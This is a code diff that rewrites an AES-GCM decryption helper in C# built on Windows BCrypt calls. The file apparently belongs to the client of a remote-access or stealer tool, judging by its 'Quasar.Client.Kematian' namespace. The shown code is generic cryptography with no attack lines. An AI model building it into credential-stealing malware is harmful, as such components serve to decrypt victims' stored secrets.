@@ -1,134 +1,134 @@
 ﻿using System;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
+using System.Text;
 
 namespace Quasar.Client.Kematian.HelpingMethods.Decryption
 {
-    class AesGcmDecryptor
+    public class AesGcmBetter
     {
-        private const string BCRYPT_AES_ALGORITHM = "AES";
-        private const string BCRYPT_CHAIN_MODE_GCM = "ChainingModeGCM";
-        private const int STATUS_SUCCESS = 0;
-
-        [DllImport("bcrypt.dll")]
-        private static extern int BCryptOpenAlgorithmProvider(
-            out IntPtr phAlgorithm,
-            string pszAlgId,
-            string pszImplementation,
-            int dwFlags);
-
-        [DllImport("bcrypt.dll")]
-        private static extern int BCryptSetProperty(
-            IntPtr hObject,
-            string pszProperty,
-            byte[] pbInput,
-            int cbInput,
-            int dwFlags);
-
-        [DllImport("bcrypt.dll")]
-        private static extern int BCryptGenerateSymmetricKey(
-            IntPtr hAlgorithm,
-            out IntPtr phKey,
-            IntPtr pbKeyObject,
-            int cbKeyObject,
-            byte[] pbSecret,
-            int cbSecret,
-            int dwFlags);
-
-        [DllImport("bcrypt.dll")]
-        private static extern int BCryptDecrypt(
-            IntPtr hKey,
-            byte[] pbInput,
-            int cbInput,
-            ref BCryptAuthInfo pPaddingInfo,
-            byte[] pbIV,
-            int cbIV,
-            byte[] pbOutput,
-            int cbOutput,
-            out int pcbResult,
-            int dwFlags);
-
-        [DllImport("bcrypt.dll")]
-        private static extern int BCryptDestroyKey(IntPtr hKey);
-
-        [DllImport("bcrypt.dll")]
-        private static extern int BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, int dwFlags);
-
-        [StructLayout(LayoutKind.Sequential)]
-        private struct BCryptAuthInfo
+        public byte[] Decrypt(byte[] key, byte[] iv, byte[] aad, byte[] cipherText, byte[] authTag)
         {
-            public int cbSize;
-            public IntPtr pbNonce;
-            public int cbNonce;
-            public IntPtr pbAuthData;
-            public int cbAuthData;
-            public IntPtr pbTag;
-            public int cbTag;
-            public IntPtr pbMacContext;
-            public int cbMacContext;
-            public int cbAADSize;
-            public int dwFlags;
+            IntPtr hAlg = OpenAlgorithmProvider(BCrypt.BCRYPT_AES_ALGORITHM, BCrypt.MS_PRIMITIVE_PROVIDER, BCrypt.BCRYPT_CHAIN_MODE_GCM);
+            IntPtr hKey, keyDataBuffer = ImportKey(hAlg, key, out hKey);
+
+            byte[] plainText;
+
+            var authInfo = new BCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(iv, aad, authTag);
+            using (authInfo)
+            {
+                byte[] ivData = new byte[MaxAuthTagSize(hAlg)];
+
+                int plainTextSize = 0;
+
+                uint status = BCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref authInfo, ivData, ivData.Length, null, 0, ref plainTextSize, 0x0);
+
+                if (status != BCrypt.ERROR_SUCCESS)
+                    throw new CryptographicException(string.Format("BCrypt.BCryptDecrypt() (get size) failed with status code: {0}", status));
+
+                plainText = new byte[plainTextSize];
+
+                status = BCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref authInfo, ivData, ivData.Length, plainText, plainText.Length, ref plainTextSize, 0x0);
+
+                if (status == BCrypt.STATUS_AUTH_TAG_MISMATCH)
+                    throw new CryptographicException("BCrypt.BCryptDecrypt(): authentication tag mismatch");
+
+                if (status != BCrypt.ERROR_SUCCESS)
+                    throw new CryptographicException(string.Format("BCrypt.BCryptDecrypt() failed with status code:{0}", status));
+            }
+
+            BCrypt.BCryptDestroyKey(hKey);
+            Marshal.FreeHGlobal(keyDataBuffer);
+            BCrypt.BCryptCloseAlgorithmProvider(hAlg, 0x0);
+
+            return plainText;
         }
 
-        public static byte[] DecryptAesGcm(byte[] encryptedData, byte[] key, byte[] nonce, byte[] tag)
+        private int MaxAuthTagSize(IntPtr hAlg)
         {
-            if (key == null || key.Length != 32) // 256-bit key
-                throw new ArgumentException("Invalid key length. Key must be 32 bytes (256 bits).", nameof(key));
+            byte[] tagLengthsValue = GetProperty(hAlg, BCrypt.BCRYPT_AUTH_TAG_LENGTH);
 
-            if (nonce == null || nonce.Length == 0)
-                throw new ArgumentException("Nonce is required.", nameof(nonce));
+            return BitConverter.ToInt32(new[] { tagLengthsValue[4], tagLengthsValue[5], tagLengthsValue[6], tagLengthsValue[7] }, 0);
+        }
 
-            if (tag == null || tag.Length != 16) // 128-bit tag
-                throw new ArgumentException("Invalid tag length. Tag must be 16 bytes (128 bits).", nameof(tag));
+        private IntPtr OpenAlgorithmProvider(string alg, string provider, string chainingMode)
+        {
+            IntPtr hAlg = IntPtr.Zero;
 
-            IntPtr hAlgorithm = IntPtr.Zero;
-            IntPtr hKey = IntPtr.Zero;
+            uint status = BCrypt.BCryptOpenAlgorithmProvider(out hAlg, alg, provider, 0x0);
 
-            try
+            if (status != BCrypt.ERROR_SUCCESS)
+                throw new CryptographicException(string.Format("BCrypt.BCryptOpenAlgorithmProvider() failed with status code:{0}", status));
+
+            byte[] chainMode = Encoding.Unicode.GetBytes(chainingMode);
+            status = BCrypt.BCryptSetAlgorithmProperty(hAlg, BCrypt.BCRYPT_CHAINING_MODE, chainMode, chainMode.Length, 0x0);
+
+            if (status != BCrypt.ERROR_SUCCESS)
+                throw new CryptographicException(string.Format("BCrypt.BCryptSetAlgorithmProperty(BCrypt.BCRYPT_CHAINING_MODE, BCrypt.BCRYPT_CHAIN_MODE_GCM) failed with status code:{0}", status));
+
+            return hAlg;
+        }
+
+        private IntPtr ImportKey(IntPtr hAlg, byte[] key, out IntPtr hKey)
+        {
+            byte[] objLength = GetProperty(hAlg, BCrypt.BCRYPT_OBJECT_LENGTH);
+
+            int keyDataSize = BitConverter.ToInt32(objLength, 0);
+
+            IntPtr keyDataBuffer = Marshal.AllocHGlobal(keyDataSize);
+
+            byte[] keyBlob = Concat(BCrypt.BCRYPT_KEY_DATA_BLOB_MAGIC, BitConverter.GetBytes(0x1), BitConverter.GetBytes(key.Length), key);
+
+            uint status = BCrypt.BCryptImportKey(hAlg, IntPtr.Zero, BCrypt.BCRYPT_KEY_DATA_BLOB, out hKey, keyDataBuffer, keyDataSize, keyBlob, keyBlob.Length, 0x0);
+
+            if (status != BCrypt.ERROR_SUCCESS)
+                throw new CryptographicException(string.Format("BCrypt.BCryptImportKey() failed with status code:{0}", status));
+
+            return keyDataBuffer;
+        }
+
+        private byte[] GetProperty(IntPtr hAlg, string name)
+        {
+            int size = 0;
+
+            uint status = BCrypt.BCryptGetProperty(hAlg, name, null, 0, ref size, 0x0);
+
+            if (status != BCrypt.ERROR_SUCCESS)
+                throw new CryptographicException(string.Format("BCrypt.BCryptGetProperty() (get size) failed with status code:{0}", status));
+
+            byte[] value = new byte[size];
+
+            status = BCrypt.BCryptGetProperty(hAlg, name, value, value.Length, ref size, 0x0);
+
+            if (status != BCrypt.ERROR_SUCCESS)
+                throw new CryptographicException(string.Format("BCrypt.BCryptGetProperty() failed with status code:{0}", status));
+
+            return value;
+        }
+
+        public byte[] Concat(params byte[][] arrays)
+        {
+            int len = 0;
+
+            foreach (byte[] array in arrays)
             {
-                // Open AES algorithm provider
-                int status = BCryptOpenAlgorithmProvider(out hAlgorithm, BCRYPT_AES_ALGORITHM, null, 0);
-                if (status != STATUS_SUCCESS)
-                    throw new CryptographicException($"Failed to open AES algorithm provider. Status: {status}");
-
-                // Set GCM chaining mode
-                byte[] gcmMode = System.Text.Encoding.Unicode.GetBytes(BCRYPT_CHAIN_MODE_GCM);
-                status = BCryptSetProperty(hAlgorithm, BCRYPT_CHAIN_MODE_GCM, gcmMode, gcmMode.Length, 0);
-                if (status != STATUS_SUCCESS)
-                    throw new CryptographicException($"Failed to set GCM chaining mode. Status: {status}");
-
-                // Generate symmetric key
-                status = BCryptGenerateSymmetricKey(hAlgorithm, out hKey, IntPtr.Zero, 0, key, key.Length, 0);
-                if (status != STATUS_SUCCESS)
-                    throw new CryptographicException($"Failed to generate symmetric key. Status: {status}");
-
-                // Prepare authentication info
-                BCryptAuthInfo authInfo = new BCryptAuthInfo
-                {
-                    cbSize = Marshal.SizeOf<BCryptAuthInfo>(),
-                    pbNonce = Marshal.UnsafeAddrOfPinnedArrayElement(nonce, 0),
-                    cbNonce = nonce.Length,
-                    pbTag = Marshal.UnsafeAddrOfPinnedArrayElement(tag, 0),
-                    cbTag = tag.Length,
-                };
-
-                // Decrypt data
-                byte[] plainText = new byte[encryptedData.Length];
-                status = BCryptDecrypt(hKey, encryptedData, encryptedData.Length, ref authInfo, null, 0, plainText, plainText.Length, out int resultSize, 0);
-                if (status != STATUS_SUCCESS)
-                    throw new CryptographicException($"Decryption failed. Status: {status}");
-
-                Array.Resize(ref plainText, resultSize);
-                return plainText;
+                if (array == null)
+                    continue;
+                len += array.Length;
             }
-            finally
+
+            byte[] result = new byte[len - 1 + 1];
+            int offset = 0;
+
+            foreach (byte[] array in arrays)
             {
-                if (hKey != IntPtr.Zero)
-                    BCryptDestroyKey(hKey);
-                if (hAlgorithm != IntPtr.Zero)
-                    BCryptCloseAlgorithmProvider(hAlgorithm, 0);
+                if (array == null)
+                    continue;
+                Buffer.BlockCopy(array, 0, result, offset, array.Length);
+                offset += array.Length;
             }
+
+            return result;
         }
     }
-
 }
